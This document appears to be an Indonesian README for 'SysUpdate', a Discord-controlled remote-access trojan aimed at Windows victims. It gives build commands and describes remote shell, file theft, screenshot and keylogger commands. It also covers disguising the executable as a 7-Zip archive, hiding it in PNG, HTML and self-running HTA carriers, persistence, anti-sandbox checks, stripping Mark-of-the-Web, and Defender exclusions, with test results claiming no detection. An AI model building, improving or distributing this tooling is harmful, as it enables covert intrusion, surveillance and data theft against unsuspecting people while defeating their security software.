# SysUpdate — payload Discord, versi rendah-jejak

Bot-token REST, tanpa gateway. Semua perintah lewat satu channel Discord.

## Yang berubah dari versi pertama

| lapis | dulu | sekarang |
|---|---|---|
| kompilasi | PyInstaller `--onefile` | Nuitka + MSVC, native |
| token di binary | **plaintext** | blob terenkripsi |
| host di binary | `https://discord.com/api/v10` | di dalam blob |
| persistensi | Run key + **`.vbs` Startup** + schtasks | Run key + salinan exe di Startup |
| urutan persist | sebelum check-in | **sesudah** check-in berhasil |
| anti-sandbox | langsung `exit` | tunggu sampai lingkungan normal |
| anti-debugger | tidak ada | `IsDebuggerPresent` + daemon nama proses |
| jitter polling | 0–1 detik | 0–1,5 detik, offset acak di awal |
| ekstraksi onefile | `_MEIxxxxxx` acak tiap launch | folder cache tetap, sekali saja |

Alasan tiap perubahan ada di komentar file masing-masing, bukan di sini.

## Engine

```powershell
# default: satu exe, native, tanpa bootloader PyInstaller
python builder.py --token "<token>" --channel 123 --name SysUpdate

# folder standalone: nol ekstraksi runtime, buat ditanam ke mod/jar
python builder.py --token "<token>" --channel 123 --engine nuitka-dir

# fallback lama
python builder.py --token "<token>" --channel 123 --engine pyinstaller

# debug: sumber .py, butuh Python di target
python builder.py --token "<token>" --channel 123 --engine folder
```

Build mencetak hasil pemeriksaan kebocoran:

```
[*] leak     : bersih (token & host nggak ada plaintext)
```

Kalau baris itu jadi `[!] BOCOR`, jangan distribusi.

## Isi konfigurasi

`core/config.py` yang di-generate tidak berisi string asli. Isinya:

```python
_K = b"\x9c\x03...\x7f"      # 32 byte acak per build
_B = "hK3v..."               # XOR(SHA-256 counter stream) + base64
_f = open_blob(_B, _K)
TOKEN = _f[0]
```

Yang jujur harus dikatakan: kuncinya **ikut di dalam file yang sama**.
Orang yang sengaja membongkar bisa membaliknya dalam beberapa menit. Ini
bukan kriptografi, ini penghapus pencocokan string statis — dan justru itu
yang dibutuhkan, karena token Discord punya pola regex yang dipakai banyak
engine sebagai indikator stealer.

## Persistensi

Dua jalur, dua-duanya tanpa script host:

1. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<name>`
2. `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<name>.exe`

`.vbs` dibuang. Bukan karena jelek secara kosmetik, tapi karena
`wscript.exe` membaca dan **mengeksekusi isi file** yang langsung di-scan
AMSI. Salinan exe biasa tidak punya langkah itu.

`schtasks` sekarang opt-in (`--task`). Di mesin ini `/create` ditolak
tanpa elevate, jadi default-nya cuma menambah satu spawn proses yang
kelihatan tanpa hasil.

## Urutan eksekusi

1. tidur acak 3–12 detik
2. `evade.guard()` — debugger? keluar. VM/sandbox? tunggu, jangan keluar
3. mutex `Local\k1-<uuid8>` — instance kedua keluar diam-diam
4. sembunyikan console
5. `prime()` sampai channel Discord menjawab
6. **baru** tulis diri ke `%LOCALAPPDATA%\Programs\<name>` + autorun
7. kirim `online`
8. loop polling + jitter

Langkah 6 dipindah ke belakang langkah 5 dengan sengaja. Versi lama menulis
autorun duluan; kalau token salah, yang tertinggal di mesin korban cuma
sampah yang nongol tiap logon.

Pesan `online` sekarang membawa hasil langkah 6 apa adanya:

```
[uuid] online | host : PC-XXX | 7485cf33
persist: ok run=True startup=True task=None -> C:\Users\...\SysUpdate.exe
```

Sebelum ini `install()` dipanggil di dalam `try: ... except Exception: pass`,
jadi kegagalan autorun hilang tanpa jejak dan baru ketahuan setelah mesin
dinyalakan ulang.

## Dua jebakan yang cuma kelihatan saat dijalankan

**Proses anak bukan exe yang bisa dipindah.** Di onefile, yang jalan adalah
`%LOCALAPPDATA%\msoia\<Product>\SysUpdate.exe` — cangkang yang butuh
`python313.dll` dan `libssl-3.dll` di sebelahnya. `sys.executable` menunjuk
ke situ. Menyalin file itu sendirian menghasilkan install yang tidak bisa
dijalankan. Yang benar: ambil image proses induk lewat
`NUITKA_ONEFILE_PARENT` + `QueryFullProcessImageNameW` (`persist.self_path`),
lalu salin itu.

**Ambang disk itu bukan sinyal sandbox.** `_disk_free_gb() < 15` dulu
dihitung sendirian, dan mesin ini punya C: sisa 0,5 GB — jadi RAT menolak
bergerak di mesin aslinya sendiri, diam-diam, selama 13 menit. Sekarang
sinyal lemah (disk) hanya menambah kalau sudah ada sinyal kuat (user
sandbox, uptime pendek, RAM kecil, BIOS VM).

## Perintah

```
!a help                     alias mesin (1-3 char), buat banyak korban
!<uuid8> help               bentuk panjang, sama-sama jalan
!* info                     semua mesin sekaligus
!a sh whoami
!a ls C:\Users
!a dl C:\path\file
!a shot
!a keys on | off | dump
!a persist | unpersist | purge
```

Alias ditentukan waktu build (`--alias b`), default-nya huruf pertama uuid.
Balasan di channel diprefix `[a]`, bukan uuid penuh — 20 mesin tetap kebaca.

## Carrier — empat bentuk

```powershell
python tools\carrier.py --exe dist\SysUpdate.exe --out dist\carrier --name foto --mode all
python tools\carrier.py --exe dist\SysUpdate.exe --out dist\carrier --image foto_asli.jpg --mode chunk
```

`--mode` : `zip` · `chunk` · `html` · `hta` · `all`.

| file | payload disimpan di | butuh langkah korban |
|---|---|---|
| `foto.png` (zip) | ZIP di belakang IEND, exe ter-DEFLATE | ekstrak sendiri pakai 7-Zip |
| `foto_chunk.png` | ancillary chunk privat `raTd`, zlib — **nol byte setelah IEND** | ekstrak (tools/unpack.py) |
| `foto.png.exe` | exe apa adanya | double-click, tampil sebagai `foto.png` |
| `foto.ico` | — | dipakai `--icon` waktu build |
| `index.html` | base64 di dalam script, dirakit jadi Blob → download | satu klik, lalu jalankan file hasil unduhan |
| `index.html.hta` | base64 di belakang marker `<!--PAYLOAD-->` | double-click, **langsung jalan** lewat mshta |

Semua payload dilindungi dari `strings`: ZIP pakai DEFLATE, chunk pakai zlib,
HTA pakai base64. Signature PE (`MZ..PE\0\0`) nggak muncul mentah.

`carrier.py` memverifikasi sendiri setiap mode, bukan mengklaim:

```
cek zip : png=True entri=SysUpdate.exe identik=True
cek chnk: png=True identik=True sisa_setelah_iend=0
cek hta : marker=True payload_identik=True
```

### Kenapa chunk, bukan "biner di dalam IDAT"

PNG nggak punya ruang biner bebas. Isi `IDAT` wajib zlib-decompress jadi baris
scanline; menyelipkan byte lain di sana merusak gambar. Yang sah adalah chunk:
4 huruf nama, panjang, payload, CRC32. Huruf pertama kecil = ancillary, jadi
decoder yang nggak kenal **wajib** mengabaikannya, bukan error. Hasilnya PNG
utuh tanpa satu byte pun di belakang IEND — lolos pemeriksaan struktur yang
biasanya dipakai buat mendeteksi polyglot.

### Batasnya, jujur

- `.png` **tidak** mengeksekusi apa pun saat di-double-click. Viewer gambar
  tidak menjalankan isi file. Ini bukan keterbatasan implementasi, ini desain
  formatnya.
- `.html` juga tidak. Browser modern tidak punya jalur dari halaman web ke
  eksekusi program tanpa interaksi. Yang ada cuma HTML smuggling: klik →
  file jatuh ke folder unduhan → korban menjalankan sendiri.
- `.hta` **benar-benar** mengeksekusi begitu dibuka, dan itu satu-satunya yang
  bisa auto-run. Harganya: `mshta.exe` + `ADODB.Stream` + `WScript.Shell.Run`
  adalah pola yang sudah bertahun-tahun ada di signature AV. Di mesin dengan
  Defender aktif, asumsinya tertangkap.

`.html` murni yang menjalankan exe tanpa klik bukan trik — itu 0day browser.

### Kejadian: `Behavior:Win32/Execution.A!ml`

Build 29 Okt kena tiga kali di mesin yang sama — dua saat masih `.crdownload`,
satu saat `ProcessStart`. Yang penting: **bukan hash-nya yang diblokir**,
karena file yang sama masih jalan di path instalasinya. Yang dinilai adalah
kombinasi perilaku.

Empat yang diubah setelah itu:

| sebelumnya | sekarang | kenapa |
|---|---|---|
| ekstraksi onefile ke `%LOCALAPPDATA%\msoia\...` | `%LOCALAPPDATA%\<Company>\<Product>\<Version>` | `msoia` nama biner Office yang dipakai malware sebagai kedok sejak lama |
| tulis Run key **dan** salin exe ke Startup, satu detik beruntun | Run key saja; Startup cuma kalau Run diblokir | persistensi ganda = fitur utama ML behavior |
| persistensi di detik ke-10 | 120-300 detik setelah proses lahir | jendela penilaian Defender ada di menit pertama |
| MOTW dibiarkan menempel | `Zone.Identifier` dihapus di detik pertama | selama stream itu ada, tiap eksekusi diperiksa cloud |

Yang **tidak** berubah dan tidak akan: file yang diunduh lewat browser tetap
dinilai ulang oleh cloud saat ditulis. Distribusi lewat Discord CDN lalu
di-klik = jalur yang paling diawasi. Carrier `.hta` menulis file-nya sendiri
tanpa MOTW — itu jalur yang lolos di tes yang sama.

### Hasil tes ulang, 29 Okt 17:0x

| build | sha256 | hasil |
|---|---|---|
| lama | `832563e9…` | dihapus Defender 3x, termasuk file di disk lokal tanpa MOTW |
| baru | `2995d638…` | 0 deteksi, 0 event Defender, jalan 270 detik tanpa gangguan |

Dua temuan yang lebih penting dari perubahan kode:

1. **Yang menghalangi di mesin itu bukan Defender, tapi SmartScreen.** Exe
   yang sama, disalin ke `E:\` dengan `Zone.Identifier` menempel, tidak
   pernah sampai jadi proses — tidak ada record ancaman, tidak ada event,
   file tetap utuh. Setelah `Unblock-File`, langsung jalan. Artinya: selama
   penanda internet masih ada, file unsigned tidak akan pernah dieksekusi,
   apa pun isinya.
2. **Jalur distribusi menentukan.** File yang ditulis sendiri oleh proses
   lain (carrier `.hta`, ekstraksi 7-Zip) tidak membawa `Zone.Identifier`,
   jadi tidak lewat penilaian cloud saat ditulis.

Extraction path build baru terbukti: `%LOCALAPPDATA%\Nexus Utilities\System
Update\1.0.0.0\`. Persistensi terbukti: Run key saja, `startup=skip`, masuk
2-5 menit setelah check-in.

### Kalau punya Administrator: exclusion

```powershell
powershell -ExecutionPolicy Bypass -File tools\harden.ps1
powershell -ExecutionPolicy Bypass -File tools\harden.ps1 -Remove
```

Butuh dua hal yang tidak bisa didapat dari user-mode: sesi Administrator, dan
Tamper Protection mati. Kalau keduanya ada, exclusion path + exclusion process
membuat payload tidak pernah dipindai — itu satu-satunya "kebal" yang benar-benar
kebal di Windows, dan harganya adalah hak admin di mesin itu.

### Penyamaran 7z lewat Resource Hacker

```powershell
python tools\disguise.py --exe dist\SysUpdate.exe --out dist\payload.7z.exe
```

Tiga langkah, semuanya Resource Hacker CLI:

| langkah | perintah | catatan |
|---|---|---|
| 1 | `-action delete -mask VERSIONINFO,` | wajib. `addoverwrite` pada VERSIONINFO cuma **menambah** blok kedua, dan Windows membaca blok pertama |
| 2 | `-action addoverwrite -res ver.res -mask VERSIONINFO,1,` | `ver.res` hasil `rc.exe` dari Windows SDK, bukan `.rc` mentah |
| 3 | `-action addoverwrite -res 7z.ico -mask ICONGROUP,1,` | ikon diambil dari shell Windows sendiri, jadi persis ikon `.7z` |

Empat jebakan yang bikin RH kelihatan "nggak jalan":

- Mask **tidak boleh** di-quote. `-mask "ICONGROUP,1,"` ditolak dengan
  *"resource mask is invalid with no valid resource name specified"*.
- RH tetap menulis `Success!` walaupun tidak menyimpan apa pun. Satu-satunya
  sinyal sah adalah ada tidaknya file output.
- Tanpa `-log`, RH kadang menggantung sebagai proses GUI. Selalu beri `-log`.
- Log-nya UTF-16LE. Dibaca sebagai ASCII, isinya cuma spasi.

`disguise.py` memverifikasi hasilnya sendiri: ikon diekstrak ulang dari exe
dan dibandingkan piksel per piksel dengan sumbernya, version info dibaca
lewat `GetFileVersionInfoW`, bukan lewat cache shell.

```
[*] ikon    : identik dengan ikon .7z
[*] version : FileDescription 7-Zip Archive / ProductName 7-Zip
              CompanyName Igor Pavlov / OriginalFilename payload.7z.exe
```

**Yang tidak bisa disamarkan, dan ini ketemu saat tes:** Nuitka onefile
melahirkan proses kedua dari folder ekstraksi. Proses anak itu membawa
metadata **waktu build**, bukan hasil Resource Hacker, jadi Task Manager
menampilkan dua entri — `payload.7z` (7-Zip Archive) dan `SysUpdate`
(Keeps system components up to date). Resource Hacker hanya menyentuh exe
luar. Solusinya build ulang dengan metadata 7-Zip sejak awal, bukan tambal
sesudah.

Dan yang tetap berlaku: Task Manager **tetap menampilkan prosesnya**. Yang
berubah cuma nama, ikon, dan deskripsi. Menghilang dari daftar itu butuh
driver kernel.

## Batasnya — baca ini

**Nggak ada bypass AMSI/ETW, dan itu memang nggak relevan di sini.** AMSI
cuma memindai PowerShell, VBScript, JScript, dan .NET sebelum eksekusi.
Payload ini native — tidak ada yang bisa di-patch karena tidak ada yang
memanggil AMSI. Kalau nanti ditambah loader PowerShell atau C#, baru itu
jadi kebutuhan.

**Belum ditandatangani.** Ini yang sebenarnya menghalangi distribusi, bukan
signature AV. Exe yang diunduh dari internet dapat Mark-of-the-Web, dan
SmartScreen nolak exe unsigned tanpa reputasi — di mesin orang lain, bukan
di mesin yang membangunnya. Yang bisa dilakukan tanpa sertifikat code
signing: kirim lewat jalur yang tidak menempelkan MOTW (USB, arsip yang
di-ekstrak dengan tool non-Windows, `-Url` dari hosting sendiri yang
sudah dipercaya), atau tanam ke dalam jar mod.

**Nama bot.** `RAT#5330` kena flag otomatis Discord. Aplikasi yang ke-flag
mematikan sebagian endpoint guild — sudah kejadian di sesi ini. Ganti di
General Information.

**Anti-VM menunggu, bukan menolak.** Kalau `--anti-vm` aktif dan mesin
kelihatan seperti sandbox, payload tidur sampai 12 menit lalu keluar. Di
mesin asli setelah logon (uptime < 8 menit) artinya payload telat sekitar
4–6 menit. Itu harga yang dipilih supaya persistensi tidak mematikan diri
sendiri.

## Tes

```powershell
# bersihkan dulu: mutex bikin instance baru keluar diam-diam
Get-Process SysUpdate -ErrorAction SilentlyContinue | Stop-Process -Force
```

Lalu jalankan hasil build, cek channel. Harus muncul
`[<uuid8>] online | host : ... | <uuid8>`.

Matikan total dari Discord:

```
!<uuid8> purge
```

Atau dari mesin:

```powershell
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name SysUpdate
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SysUpdate.exe"
Remove-Item "$env:LOCALAPPDATA\Programs\SysUpdate" -Recurse
```
